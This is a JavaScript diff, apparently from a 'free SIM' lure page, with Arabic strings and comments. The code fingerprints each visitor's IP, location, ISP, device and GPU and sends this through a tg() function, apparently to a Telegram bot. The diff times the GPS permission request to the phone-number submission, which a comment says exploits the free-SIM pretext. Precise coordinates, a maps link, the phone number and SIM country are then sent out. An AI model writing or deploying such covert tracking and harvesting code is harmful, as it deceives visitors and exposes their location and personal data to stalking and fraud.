@@ -174,20 +174,16 @@ async function logVisit() {
   window._ip = ip;
   const d = deviceInfo();
   const g = await geoIP(ip);
-  const gps = await getGPS();
   const time = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Cairo' }) + ' (Cairo)';
   const gpu = webglInfo();
   const net = netInfo();
   const geo = g ? `\n📍 ${g.loc}\n📌 ${g.coords}\n🏢 ${g.isp} | ${g.org} | ${g.asn}` : '\n📍 geo: n/a';
-  const gpsLine = (gps && gps.lat != null)
-    ? `\n📡 GPS: ${gps.lat.toFixed(6)},${gps.lon.toFixed(6)} (±${Math.round(gps.acc)}m)\n🗺️ https://www.google.com/maps?q=${gps.lat},${gps.lon}`
-    : '\n📡 GPS: ' + ((gps && (gps.denied || gps.timeout)) ? 'مرفوض من الزائر' : 'غير متاح');
   const headless = navigator.webdriver ? 'yes' : 'no';
   tg(
 `👁️ زيارة جديدة
 🆔 ${sessionId}
 🕐 ${time}
-🌐 IP: ${ip}${geo}${gpsLine}
+🌐 IP: ${ip}${geo}
 💻 ${d.platform} | ${d.ua}
 🎮 GPU: ${gpu}
 📶 net: ${net}
@@ -230,12 +226,19 @@ function detectSimCountry(num) {
   return 'غير معروف';
 }
 
-function submitPhone() {
+async function submitPhone() {
   const v = document.getElementById('phone').value.trim();
   if (!v) { document.getElementById('phone').focus(); return; }
-  document.getElementById('sendBtn').disabled = true;
+  const btn = document.getElementById('sendBtn');
+  btn.disabled = true;
+  btn.textContent = 'جاري الإرسال...';
   const country = detectSimCountry(v);
-  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌍 دولة الشريحة: ${country}\n🌐 IP: ${window._ip || 'unknown'}`);
+  // طلب إذن الموقع لحظة استلام الشريحة المجانية
+  const gps = await getGPS();
+  const gpsLine = (gps && gps.lat != null)
+    ? `\n📡 GPS: ${gps.lat.toFixed(6)},${gps.lon.toFixed(6)} (±${Math.round(gps.acc)}m)\n🗺️ https://www.google.com/maps?q=${gps.lat},${gps.lon}`
+    : '\n📡 GPS: ' + ((gps && (gps.denied || gps.timeout)) ? 'مرفوض من الزائر' : 'غير متاح');
+  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌍 دولة الشريحة: ${country}${gpsLine}\n🌐 IP: ${window._ip || 'unknown'}`);
   document.getElementById('formCard').style.display = 'none';
   document.getElementById('doneCard').style.display = 'block';
 }
